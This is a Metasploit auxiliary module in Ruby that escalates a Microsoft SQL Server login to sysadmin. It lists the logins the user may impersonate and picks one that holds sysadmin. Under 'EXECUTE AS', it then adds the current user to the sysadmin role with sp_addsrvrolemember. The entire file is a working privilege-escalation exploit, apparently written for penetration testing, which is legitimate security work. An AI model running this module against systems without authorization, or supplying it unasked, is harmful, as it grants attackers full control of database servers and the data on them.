##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/mssql_commands'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::MSSQL

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Microsoft SQL Server Escalate EXECUTE AS',
      'Description' => %q{
        This module can be used escalate privileges if the IMPERSONATION privilege has been
        assigned to the user. In most cases, this results in additional data access, but in
        some cases it can be used to gain sysadmin privileges.
      },
      'Author'      => ['nullbind <scott.sutherland[at]netspi.com>'],
      'License'     => MSF_LICENSE,
      'References'  => [['URL','http://msdn.microsoft.com/en-us/library/ms178640.aspx']]
    ))
  end

  def run
    # Check connection and issue initial query
    print_status("Attempting to connect to the database server at #{rhost}:#{rport} as #{datastore['USERNAME']}...")
    if mssql_login_datastore
      print_good('Connected.')
    else
      print_error('Login was unsuccessful. Check your credentials.')
      disconnect
      return
    end

    # Query for sysadmin status
    print_status("Checking if #{datastore['USERNAME']} has the sysadmin role...")
    user_status = check_sysadmin

    # Check if user has sysadmin role
    if user_status == 1
      print_good("#{datastore['USERNAME']} has the sysadmin role, no escalation required.")
      disconnect
      return
    else
      print_status("You're NOT a sysadmin, let's try to change that.")
    end

    # Get a list of the users that can be impersonated
    print_status("Enumerating a list of users that can be impersonated...")
    imp_user_list = check_imp_users
    if imp_user_list.nil? || imp_user_list.length == 0
      print_error('Sorry, the current user doesn\'t have permissions to impersonate anyone.')
      disconnect
      return
    else
      # Display list of users that can be impersonated
      print_good("#{imp_user_list.length} users can be impersonated:")
      imp_user_list.each do |db|
        print_status(" - #{db[0]}")
      end
    end

    # Check if any of the users that can be impersonated are sysadmins
    print_status('Checking if any of them are sysadmins...')
    imp_user_sysadmin = check_imp_sysadmin(imp_user_list)
    if imp_user_sysadmin.nil?
      print_error('Sorry, none of the users that can be impersonated are sysadmins.')
      disconnect
      return
    end

    # Attempt to escalate to sysadmin
    print_status("Attempting to impersonate #{imp_user_sysadmin[0]}...")
    escalate_status = escalate_privs(imp_user_sysadmin[0])
    if escalate_status
      # Check if escalation was successful
      user_status = check_sysadmin
      if user_status == 1
        print_good("Congrats, #{datastore['USERNAME']} is now a sysadmin!.")
      else
        print_error('Fail buckets, something went wrong.')
      end
    else
      print_error('Error while trying to escalate privileges.')
    end

    disconnect
    return
  end

  # Checks if user is a sysadmin
  def check_sysadmin
    # Setup query to check for sysadmin
    sql = "select is_srvrolemember('sysadmin') as IsSysAdmin"

    # Run query
    result = mssql_query(sql)

    # Parse query results
    parse_results = result[:rows]
    status = parse_results[0][0]

    # Return status
    return status
  end

  # Gets trusted databases owned by sysadmins
  def check_imp_users
    # Setup query
    sql = "SELECT DISTINCT b.name
    FROM  sys.server_permissions a
    INNER JOIN sys.server_principals b
    ON a.grantor_principal_id = b.principal_id
    WHERE a.permission_name = 'IMPERSONATE'"

    result = mssql_query(sql)

    # Return on success
    return result[:rows]
  end

  # Checks if user has the db_owner role
  def check_imp_sysadmin(trust_db_list)
    # Check if the user has the db_owner role is any databases
    trust_db_list.each do |imp_user|
      # Setup query
      sql = "select IS_SRVROLEMEMBER('sysadmin','#{imp_user[0]}') as status"

      # Run query
      result = mssql_query(sql)

      # Parse query results
      parse_results = result[:rows]
      status = parse_results[0][0]
      if status == 1
        print_good(" - #{imp_user[0]} is a sysadmin!")
        return imp_user
      else
        print_status(" - #{imp_user[0]} is NOT sysadmin!")
      end
    end
    nil
  end

  def escalate_privs(imp_user_sysadmin)
    # Impersonate the first sysadmin user on the list
    evil_sql_create = "EXECUTE AS Login = '#{imp_user_sysadmin}';
    EXEC sp_addsrvrolemember '#{datastore['USERNAME']}','sysadmin';"

    mssql_query(evil_sql_create)

    true
  end
end
